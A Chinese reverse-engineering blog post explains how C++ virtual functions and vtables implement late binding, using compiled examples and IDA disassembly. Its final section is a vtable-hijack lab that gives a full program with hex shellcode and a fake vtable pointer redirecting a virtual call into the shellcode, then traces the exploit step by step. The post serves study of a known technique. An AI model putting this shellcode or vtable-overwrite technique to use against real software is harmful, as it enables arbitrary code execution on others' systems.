---
title: C++晚联编机制如何实现
date: 2022-09-23 22:00:00
tags: reverse
mathjax: true


---













# C++晚联编如何实现





## 虚函数对 对象的内存结构的影响

```c
#pragma pack(1) //取消所有对齐要求
#include <iostream>
#include <windows.h>
using namespace std;

class A{
    public:
    char only[1];
};
class B{
    public:
    char only[1];
    virtual void func(){}
};
A a;
B b;
int main(){
    cout<<sizeof(A)<<"  "<<sizeof(B)<<endl;
    cout<<&a<<"  "<<&a.only<<endl;
    cout<<&b<<"  "<<&b.only<<endl;
    return 0;
}
```

```c
PS C:\Users\86135\Desktop\testC++\testCpp> g++ main.cpp -O0 -o main -m32
PS C:\Users\86135\Desktop\testC++\testCpp> ./main
1  5
0x4da020  0x4da020
0x4da024  0x4da028
```

a和b两个对象的唯一区别就是,b有一个虚函数,a没有

但是b却又5个字节大小,a只有1个,

a的基地址就是a的第一个成员only的基地址

b的基地址加上4偏移才到其第一个成员only的基地址

b最开始的4个字节究竟藏了什么呢?虚表指针







## 多态与晚联编

```c
#include <iostream>
using namespace std;


class A {
public:
	virtual void func1() {
		cout << "in father func1" << endl;
	}
	virtual int func2(int a, int b) {
		return a + b;
	}
	void func3() {
		cout << "in father func3" << endl;
	}

};
class B :public A {
public:
	void func1() {
		cout << "in son func1" << endl;
	}
	void func3() {
		cout << "in son func3" << endl;
	}
};
void main() {
	A* handle = new B;
	handle->func1();//只有这种指针调用方式才可以多态，用·号成员符号无法调用
	handle->func2(5, 6);//虚函数,但是没有重载调用子类虚函数
	handle->func3();//普通成员函数,但是handle是A类型指针,因此会调用A类的func3函数
	delete handle;
}
```

### A* handle = new B;

main函数开始这么一坨,就干了`A* handle = new B;`这一个事

![image-20220922184558826](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922184558826.png)

但是很迷的是,在主函数栈帧中,就对象的指针就有三个,handle1,handle2,handle,前两者都是临时的,在两三条指令中出现过之后就不再使用了,最后handle接管了大权.

如果打开编译优化可能情况会好一点



其中调用构造函数`??0B@@QAE@XZ`的时候,首先调用了父类的构造函数,在父类的构造函数中注册了父类的虚函数表,然后又回到本构造函数中,注册子类的虚函数表,覆盖了父类的虚函数表



```asm
.text:00641140 push    ebp
.text:00641141 mov     ebp, esp
.text:00641143 push    ecx
.text:00641144 mov     [ebp+this], ecx
.text:00641147 mov     ecx, [ebp+this] ; this
.text:0064114A call    ??0A@@QAE@XZ    ; A::A(void)
.text:0064114F mov     eax, [ebp+this]
.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable'
.text:00641158 mov     eax, [ebp+this]
.text:0064115B mov     esp, ebp
.text:0064115D pop     ebp
.text:0064115E retn
```



#### A::A()

子类构造函数无论如何都会首先隐式执行父类的构造函数

```asm
.text:00641160 push    ebp
.text:00641161 mov     ebp, esp
.text:00641163 push    ecx
.text:00641164 mov     [ebp+this], ecx
.text:00641167 mov     eax, [ebp+this]
.text:0064116A mov     dword ptr [eax], offset ??_7A@@6B@ ; const A::`vftable'
.text:00641170 mov     eax, [ebp+this]
.text:00641173 mov     esp, ebp
.text:00641175 pop     ebp
.text:00641176 retn
```

这里关键的一点就是注册了父类的虚函数表,父类构造函数执行完之后,对象的状态是这样的

![注册父类虚表指针](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192353739.png)



#### 回到子类构造函数

```asm
.text:0064114F mov     eax, [ebp+this]
.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable'
.text:00641158 mov     eax, [ebp+this]
.text:0064115B mov     esp, ebp
.text:0064115D pop     ebp
.text:0064115E retn
```

从父类构造函数回来之后,又将B::vftable@rdata注册到对象的第一个双字上,覆盖了父类构造函数的注册效果

实际上对于这个啥成员也没有的子类,父类构造函数真的执行了一个寂寞,它儿子不听话篡改了它老子的虚表指针

![注册子类虚表指针,覆盖父类虚表指针](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192605634.png)

A和B类的虚函数表都在rdata区,并且距离很近

```asm
.rdata:006431FC ; void (__cdecl *const A::`vftable'[3])()
.rdata:006431FC ??_7A@@6B@ dd offset ?func1@A@@UAEXXZ   ; DATA XREF: A::A(void)+A↑o
.rdata:006431FC                                         ; A::func1(void)
.rdata:00643200 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)
...
.rdata:0064320C ; void (__cdecl *const B::`vftable'[3])()
.rdata:0064320C ??_7B@@6B@ dd offset ?func1@B@@UAEXXZ   ; DATA XREF: B::B(void)+12↑o
.rdata:0064320C                                         ; B::func1(void)
.rdata:00643210 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)
```

虽然只有两个虚函数,但是虚函数表有三项,其中前两项是函数指针,最后一项用NULL表示虚函数表结束

还要注意的是,两个虚函数表中的func1是不同的函数指针,但是func2是同一个函数指针

```c
?func1@A@@UAEXXZ
?func1@B@@UAEXXZ
?func2@A@@UAEHHH@Z 
```

这是因为子类没有重载了func1,但是没有重载func2,于是两个虚表的第一个指针分别指向两个不同的函数,两个虚表的第二个指针指向同一个函数

![image-20220922200159404](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922200159404.png)



虚表位于rdata区,可想而知,这里的虚函数指针值在编译链接时就已经决定了,整个运行过程中不会发生变化

**因此可以说多态的关键,就在于构造函数一开始注册哪个类的虚函数表**

### handle->func1();

下面马上就要调用第一个虚函数了



```asm
.text:006410E3 mov     ecx, [ebp+handle];对象地址放到ecx中作为this指针
.text:006410E6 mov     edx, [ecx];对象的第一个双字放到edx中
.text:006410E8 mov     ecx, [ebp+handle];对象地址放到ecx中作为this指针
.text:006410EB mov     eax, [edx];对象的第一个双字再解引用取得的值放到eax中
.text:006410ED call    eax;调用eax中的地址
```

这个过程画在图上相当于

![调用一个虚函数](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192743617.png)

> 所谓"动态联编"或者"晚联编"就体现在这里,要调用的虚函数是以变量的形式放到eax中调用的
>
> 而一般调用函数都是直接写死了`call 函数地址`
>
> 并且在调用虚函数的时候,编译器还真不知道要调用哪个函数
>
> 编译器只是在对象的构造函数中注册该对象的虚表,覆盖父类的虚表,然后后来在调用虚函数的时候只需要查虚表,而无需关心这是谁的虚表,因为构造函数时已经注册好这是谁的虚表了





### handle->func2(5, 6);

第二个虚函数,与func1虚函数的主要区别是,子类重写了func1,但是没有重写func2

```asm
.text:006410EF push    6
.text:006410F1 push    5
.text:006410F3 mov     ecx, [ebp+handle];ecx中是对象的地址
.text:006410F6 mov     edx, [ecx];edx是对象的第一个双字
.text:006410F8 mov     ecx, [ebp+handle];ecx是对象的地址
.text:006410FB mov     eax, [edx+4];对象的第一个双字的值加上4,也就是虚函数表偏移4
.text:006410FE call    eax
```

`&vtable+4=vtable[1]`

相当于调用了`vtable[1]`上面存放的函数





### handle->func3();

普通的成员函数,但是该函数被子类重载过,

由于对象的指针是父类指针,因此这里会调用父类的func3函数

```asm
.text:00641100 mov     ecx, [ebp+handle] ; this
.text:00641103 call    ?func3@A@@QAEXXZ ; A::func3(void)
```

这个函数的调用十分滴简单

根据stdcall调用约定,ecx中放上对象地址,然后就直接调用成员函数了

为了区分子类函数和父类函数,vc++编译器给父类的func3函数命名为`?func3@A@@QAEXXZ`

这是在编译链接的时候就写死了的

### 为什么要有虚表呢?

虚表起码可以是在编译链接阶段可以决定的,为了让运行时需要做的事情尽可能少,应该存在虚表这个东西

虚表不能直接放到对象里面吗?不能

一是因为,一种类型的所有对象,共用一个虚表,因此在进程地址空间中只保留一个虚表就够了,这有点类似于共享库的缩影.

二是因为,如果把虚函数的地址直接放到对象里面,会导致对象臃肿.

现在在对象里面只保留一个虚表指针,只会给对象增加4个字节的空间,已经算是最合理的设计了

## ` ->`调用和`.`调用

对象.成员函数,这种调用方式不会触发多态,不会访问虚函数表,子类就调用子类重写的成员函数,没有重写则调用父类的

指针->成员函数,这种调用方式会触发多态,通过虚函数表决定执行哪个函数

同样的程序,使用对象.这种调用方式

```c
int main() {
	B b;
    b.func1();
    b.func2(5,6);
    b.func3();
    return 0;
}
```

实际上根本没有访问虚表

```asm
...
mov     eax, offset off_4D71D0
mov     [ebp+var_C], eax
lea     eax, [ebp+var_C]
mov     ecx, eax
call    __ZN1B5func1Ev  ; B::func1(void);写死的访问哪个函数
lea     eax, [ebp+var_C]
mov     dword ptr [esp+4], 6 ; int
mov     dword ptr [esp], 5 ; this
mov     ecx, eax
call    __ZN1A5func2Eii ; A::func2(int,int);写死的访问哪个函数
sub     esp, 8
lea     eax, [ebp+var_C]
mov     ecx, eax
call    __ZN1B5func3Ev  ; B::func3(void);写死的访问哪个函数
...
```







## 虚函数漏洞

### 虚表指针与虚函数指针

virtual修饰的成员函数,虚函数

虚函数的入口地址统一的保存在虚表中

对象调用虚函数时首先通过**虚表指针**找到虚表,然后从虚表中取出虚函数地址,然后call

虚表指针保存在对象的内存空间,紧接着虚表指针的是其他成员变量

![image-20220920225443155](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920225443155.png)

如何攻击这个机制呢?

这是本来的状态

![本来状态](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222434821.png)

可以修改对象头4个字节的虚表地址,改成假的虚表地址,这个假虚表上维护着shellcode的地址

![修改虚表指针](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222852145.png)

还可以保持虚表指针不变,修改虚表中的函数地址

![修改虚函数地址](https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923225918430.png)





### 存在漏洞的代码

```c
class Failwest
{
public:
	char buf[200];
	virtual void test(void)
	{
		cout<<"Class Vtable::test()"<<endl;
	}
};
```



每个Failwest函数的最初四个字节,在buf之前,都是虚表指针,



```c
#include "windows.h"
#include "iostream.h"

char shellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x1C\x88\x40\x00";//set fake virtual function pointer

class Failwest
{
public:
	char buf[200];
	virtual void test(void)
	{
		cout<<"Class Vtable::test()"<<endl;
	}
};
Failwest overflow, *p;
void main(void)
{
	char * p_vtable;
	p_vtable=overflow.buf-4;//point to virtual table
	//__asm int 3
	//reset fake virtual table to 0x004088cc
	//the address may need to ajusted via runtime debug
	p_vtable[0]=0xCC;
	p_vtable[1]=0x88;
	p_vtable[2]=0x40;
	p_vtable[3]=0x00;
	strcpy(overflow.buf,shellcode);//set fake virtual function pointer
	p=&overflow;
	p->test();
}
```

overflow是全局位置定义的一个Failwest对象,他有一个成员变量数组char buf[200],还有一个虚函数test

通过修改虚函数表中虚函数的地址就可以让p->test()这种调用方式上当

虚函数表指针位于对象的第一个成员之前4个字节,因此一开始

`char *p_vtable=overflow.buf-4`此时p_vtable指针和overflow.buf的虚表指针指向同一块地址了

由于overflow对象只有一个虚函数,因此虚表一开始就是该虚函数的实际地址.

```c
	p_vtable[0]=0xCC;
	p_vtable[1]=0x88;
	p_vtable[2]=0x40;
	p_vtable[3]=0x00;
```

这就将该虚函数的地址修改为0x004088CC,这里恰好是shellcode的首地址(需要调试确定)

然后p=&overflow,p指针指向overflow对象

通过指针调用对象的虚函数,需要去查虚函数表,应该调用哪一个函数,而虚函数表相应位置的函数地址已经被修改为shellcode的地址.

p->test()本来应该是执行overflow的第一个也是唯一一个虚函数,但执行了shellcode



### 调试观察

这个程序在win11,winXP,win2k上都可以弹窗,直接在win11上用ida分析

```asm
.text:00401050 push    esi
.text:00401051 push    edi
.text:00401052 mov     edi, offset shellcode
.text:00401057 or      ecx, 0FFFFFFFFh
.text:0040105A xor     eax, eax
.text:0040105C mov     byte ptr overflow_vtable, 0CCh
.text:00401063 repne scasb
.text:00401065 not     ecx
.text:00401067 sub     edi, ecx
.text:00401069 mov     byte ptr overflow_vtable+1, 88h
.text:00401070 mov     eax, ecx
.text:00401072 mov     esi, edi
.text:00401074 mov     edi, offset overflow_buf
.text:00401079 mov     byte ptr overflow_vtable+2, 40h ; '@'
.text:00401080 shr     ecx, 2
.text:00401083 mov     byte ptr overflow_vtable+3, 0
.text:0040108A rep movsd
.text:0040108C mov     ecx, eax
.text:0040108E and     ecx, 3
.text:00401091 rep movsb
.text:00401093 mov     edx, overflow_vtable
.text:00401099 mov     ecx, offset overflow_vtable
.text:0040109E mov     p, ecx
.text:004010A4 call    dword ptr [edx]
.text:004010A6 pop     edi
.text:004010A7 pop     esi
.text:004010A8 retn
.text:004010A8 _main endp
```

在`mov     byte ptr overflow_vtable, 0CCh`修改虚函数地址之前,看看此时overflow_vtable上放着的实际的虚函数地址是谁

```asm
.data:00408818 overflow_vtable dd 4070C0h              ; DATA XREF: sub_401010↑w
.data:00408818                                         ; _main+C↑w ...
```

该虚函数的实际地址是0x4070C0

到这里看看

```asm
.rdata:004070C0 off_4070C0 dd offset sub_401020         ; DATA XREF: sub_401010↑o
```

这里又是一个地址,去sub_401020看看

thiscall调用约定中ecx用来传递this指针

```asm
.text:00401020 sub_401020 proc near                    ; DATA XREF: .rdata:off_4070C0↓o
.text:00401020 push    offset aClassVtableTes          ; "Class Vtable::test()"
.text:00401025 mov     ecx, offset dword_4088F0        ; this
.text:0040102A call    ??6ostream@@QAEAAV0@PBD@Z       ; ostream::operator<<(char const *)
.text:0040102F push    offset sub_4010D0
.text:00401034 push    0Ah                             ; int
.text:00401036 mov     ecx, eax                        ; this
.text:00401038 call    ??6ostream@@QAEAAV0@E@Z         ; ostream::operator<<(uchar)
.text:0040103D mov     ecx, eax
.text:0040103F call    sub_4010B0
.text:00401044 retn
.text:00401044 sub_401020 endp
```

虚函数地址修改完毕,shellcode也写入完毕了,此时要调用虚函数了,且看这里的汇编指令是啥样的

```asm
.text:00401093 mov     edx, overflow_vtable
.text:00401099 mov     ecx, offset overflow_vtable;设置this指针
.text:0040109E mov     p, ecx;无意义
.text:004010A4 call    dword ptr [edx];解引用,调用虚函数表的第一个函数
```

单步步入这个call就到了shellcode区域了

```asm
.data:0040881C overflow_buf:                           ; DATA XREF: _main+24↑o
.data:0040881C cld
.data:0040881D push    1E380A6Ah
.data:00408822 push    4FD18963h
.data:00408827 push    0C917432h
...
```















